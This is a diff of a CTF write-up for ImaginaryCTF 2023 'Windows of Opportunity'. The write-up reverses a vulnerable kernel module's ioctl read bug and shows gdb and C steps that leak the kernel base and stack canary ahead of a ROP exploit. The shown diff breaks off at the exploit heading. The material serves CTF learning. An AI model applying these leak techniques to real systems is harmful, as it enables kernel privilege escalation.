@@ -5,7 +5,7 @@ categories: Pwn Kernel
 tags: Hacking Pwn
 ---
 
-#IMAGINARY CTF 2023 - Windows of Opportunity
+##IMAGINARY CTF 2023 - Windows of Opportunity
 
 Continuing this series of linux kernel exploitation, today we will explore , as title suggests, Windows of opportunity ([download here](https://cdn.discordapp.com/attachments/732682111462539276/1131972029415948368/opportunity_dist.zip#opportunity_dist.zip)), is very similar to Kernel ROP, but this time we have ioctls.
 
@@ -52,8 +52,10 @@ Decompressing initramfs.cpio we can Reverse Engineering chall.ko, the vulnerable
     0000011e          noreturn
     00000110      return __x86_return_thunk(0, 0, 0) __tailcall
 
+
 We see that there is a trivial arbitrary read vuln, we will use this to leak stuff. Analyzing it better `rsi_3` is ioctl number in this case is 0x1337, `rdx_3` is like an array we pass an array of max 0x108/8 elements, read the first element (array[0]) and write the result in array[1].
 There is also device_write():
+
 
     00000130  int64_t device_write()
     
@@ -338,12 +340,15 @@ Let's look at the kernel with some more privilege, let's modify `etc/init.d/rcS`
     echo 0 > /proc/sys/kernel/kptr_restrict
     echo 0 > /proc/sys/kernel/perf_event_paranoid
     echo 0 > /proc/sys/kernel/dmesg_restrict
+
 To compress the initramfs I wrote this bash script
+
 
     cd initramfs
     find . -print0 \
     | cpio --null -ov --format=newc > initramfs.cpio
     mv ./initramfs.cpio ../.
+
 If all went good you should see something like this:
 
     / # cat /proc/kallsyms |head
@@ -357,6 +362,7 @@ If all went good you should see something like this:
     0000000000018000 A entry_stack_storage
     0000000000019000 A espfix_waddr
     0000000000019008 A espfix_stack
+
 I also attached gdb to vmlinux, I found vmlinux thanks to this [amazing tool](https://github.com/marin-m/vmlinux-to-elf), just follow installation instruction and then do this:
 
     $ vmlinux-to-elf bzImage vmlinux
@@ -372,11 +378,13 @@ I also attached gdb to vmlinux, I found vmlinux thanks to this [amazing tool](ht
     [i] Null addresses overall: 0.00133629 %
     [+] Found kallsyms_offsets at file offset 0x01767490
     [+] Successfully wrote the new ELF kernel to vmlinux
+
 But why all these for just leaking the stack canary?
 Our canary is located at $gs+0x28, easy to verify
 
     pwndbg> x/gx $gs_base+0x28
     0xffff8f3c4f600028:	0x19c51c1d2a206800
+
 We need a way to leak gs_base+0x28 address or something near, but how we can do kernel is huge!
 gs_base is determined at runtime, we want to look for places that store data and is also writeable/modifiable at runtime => .BSS
 We can do it by grepping all kernel symbols from /proc/kallsyms with
@@ -415,6 +423,7 @@ This is the first page:
     ffffffffad5441b8 b ibs_caps
     ffffffffad5441c0 b iommu_cpumask
     ffffffffad5445c0 b msr_mask
+
 From this address `0xffffffffad544010` the various address stabilizes so we can check on gdb if from this address there is some pointer to gs_base.
 
     pwndbg> x/100gx 0xffffffffad544010
@@ -468,6 +477,7 @@ From this address `0xffffffffad544010` the various address stabilizes so we can 
     0xffffffffad544300:	0x0000000000000000	0x0000000000000000
     0xffffffffad544310:	0x0000000000000000	0x0000000000000000
     0xffffffffad544320:	0x0000000000000000	0x0000000000000000
+
 GS_BASE is at 0xffff8f3c4f600000, so the address that point to something near it is `0xffffffffad544050`:
 
     pwndbg> x/gx $gs_base
@@ -476,6 +486,7 @@ GS_BASE is at 0xffff8f3c4f600000, so the address that point to something near it
     0xffffffffad544050:	0xffff8f3c4fcdb8c0
     pwndbg> p/x 0xffff8f3c4fcdb8c0-$gs_base+0x28
     $2 = 0x6db8e8
+
 But gdb is bad at calculating this stuff:
 0xffff8f3c4fcdb8c0 − 0x6db8e8 = 0xFFFF8F3C4F5FFFD8
 0xffff8f3c4f600028 (cookie) −0xFFFF8F3C4F5FFFD8 = 0x50
@@ -484,7 +495,9 @@ Now we need to identify that address we are lucky to have an exploit that leaks 
 
     pwndbg> p/x 0xffffffffad544050 - 0xffffffffaae00000
     $3 = 0x2744050
+
 So translating all in c code it will be:
+
 ```c
 unsigned long cookie;
 unsigned long leak[32] = {0};
@@ -510,6 +523,7 @@ Running it we get:
 
     Kernel Base: ffffffff8b200000
     Kernel Cookie: d54ce87f65d7bf00
+
 Seems pretty good to me!
 
 # EXPLOIT
